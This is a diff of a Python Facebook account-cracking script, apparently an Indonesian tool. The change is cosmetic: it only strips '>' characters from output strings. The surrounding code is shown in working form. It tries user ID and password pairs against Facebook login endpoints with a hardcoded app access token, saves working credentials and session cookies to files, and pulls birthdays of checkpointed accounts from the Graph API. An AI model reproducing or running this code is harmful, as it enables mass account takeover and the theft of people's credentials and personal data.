@@ -402,9 +402,9 @@ def api(uid, pwx):
 		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 		if "session_key" in send.text and "EAAA" in send.text:
-			print("\r  \033[0;92m >Facebook.com/%s |%s |%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+			print("\r  \033[0;92m Facebook.com/%s |%s |%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 			ok.append("%s|%s"%(uid, pw))
-			open("OK/%s.txt"%(tanggal),"a").write("  >Facebook.com/%s | %s\n"%(uid, pw))
+			open("OK/%s.txt"%(tanggal),"a").write("  Facebook.com/%s | %s\n"%(uid, pw))
 			break
 		elif "www.facebook.com" in send.json()["error_msg"]:
 			try:
@@ -413,18 +413,18 @@ def api(uid, pwx):
 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 					month, day, year = ttl.split("/")
 					month = bulan_ttl[month]
-					print("\r  \033[0;93m >Facebook.com/%s |%s |%s %s %s\033[0;97m"%(uid, pw, day, month, year))
+					print("\r  \033[0;93m Facebook.com/%s |%s |%s %s %s\033[0;97m"%(uid, pw, day, month, year))
 					cp.append("%s|%s"%(uid, pw))
-					open("CP/%s.txt"%(tanggal),"a").write("  >Facebook.com/%s | %s | %s %s %s\n"%(uid, pw, day, month, year))
+					open("CP/%s.txt"%(tanggal),"a").write("  Facebook.com/%s | %s | %s %s %s\n"%(uid, pw, day, month, year))
 					break
 			except (KeyError, IOError):
 				day = (" ")
 				month = (" ")
 				year = (" ")
 			except:pass
-			print("\r  \033[0;93m >Facebook.com/%s | %s\033[0;97m        "%(uid, pw))
+			print("\r  \033[0;93m Facebook.com/%s | %s\033[0;97m        "%(uid, pw))
 			cp.append("%s|%s"%(uid, pw))
-			open("CP/%s.txt"%(tanggal),"a").write("  >Facebook.com/%s | %s\n"%(uid, pw))
+			open("CP/%s.txt"%(tanggal),"a").write("  Facebook.com/%s | %s\n"%(uid, pw))
 			break
 		else:
 			continue
@@ -458,9 +458,9 @@ def crack(uid, pwx, host, **kwargs):
 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
-				print("\r  \033[0;92m* >Facebook.com/%s | %s| %s\033[0;97m"%(uid, pw, kuki))
+				print("\r  \033[0;92m* Facebook.com/%s | %s| %s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
-				open("OK/%s.txt"%(tanggal),"a").write("  >Facebook.com/%s | %s\n"%(uid, pw))
+				open("OK/%s.txt"%(tanggal),"a").write("  Facebook.com/%s | %s\n"%(uid, pw))
 				break
 			elif "checkpoint" in ses.cookies.get_dict().keys():
 				try:
@@ -469,18 +469,18 @@ def crack(uid, pwx, host, **kwargs):
 						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 						month, day, year = ttl.split("/")
 						month = bulan_ttl[month]
-						print("\r  \033[0;93m >Facebook.com/%s | %s |%s %s %s\033[0;97m"%(uid, pw, day, month, year))
+						print("\r  \033[0;93m Facebook.com/%s | %s |%s %s %s\033[0;97m"%(uid, pw, day, month, year))
 						cp.append("%s|%s"%(uid, pw))
-						open("CP/%s.txt"%(tanggal),"a").write("  >Facebook.com/%s | %s| %s %s %s\n"%(uid, pw, day, month, year))
+						open("CP/%s.txt"%(tanggal),"a").write("  Facebook.com/%s | %s| %s %s %s\n"%(uid, pw, day, month, year))
 						break
 				except (KeyError, IOError):
 					day = (" ")
 					month = (" ")
 					year = (" ")
 				except:pass
-				print("\r  \033[0;93m >Facebook.com/%s | %s\033[0;97m        "%(uid, pw))
+				print("\r  \033[0;93m Facebook.com/%s | %s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tanggal),"a").write("  >Facebook.com/%s | %s\n"%(uid, pw))
+				open("CP/%s.txt"%(tanggal),"a").write("  Facebook.com/%s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -509,7 +509,7 @@ def ingfo():
 		titid  = kontol.split("|")
 		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  <Facebook.com/","")))
 		try:
-			check_in(titid[0].replace("  >Facebook.com/",""), titid[1])
+			check_in(titid[0].replace("  Facebook.com/",""), titid[1])
 		except requests.exceptions.ConnectionError:
 			pass
 	print("\n [!] cek akun sudah selesai...")
